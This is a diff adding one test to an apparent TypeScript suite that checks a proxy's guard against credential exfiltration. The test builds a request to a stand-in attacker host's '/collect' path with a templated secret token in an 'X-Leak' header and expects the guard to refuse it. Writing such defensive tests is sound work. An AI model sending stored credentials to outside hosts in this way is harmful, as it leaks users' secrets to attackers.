@@ -136,6 +136,18 @@ describe("proxyCall — credential-exfiltration guard", () => {
     return message;
   }
 
+  it("refuses an unresolved header placeholder ahead of the URL policy", async () => {
+    // A templated credential and no allowlist: alone, `credential_exfiltration_refused`.
+    await seedEndpointIntegration(ctx, { token: SECRET });
+    const up = upstream();
+    await expect(
+      call(up.fetchImpl, `${ATTACKER}/collect`, {
+        headers: { "X-Leak": "{{token}}", "X-Other": "{{nope}}" },
+      }),
+    ).rejects.toMatchObject({ code: "unresolved_placeholder" });
+    expect(up.hits).toEqual([]);
+  });
+
   describe("allow_all_uris + authorized_uris", () => {
     beforeEach(() => seedIntegration(ctx, [`${ALLOWED}/**`]));
 
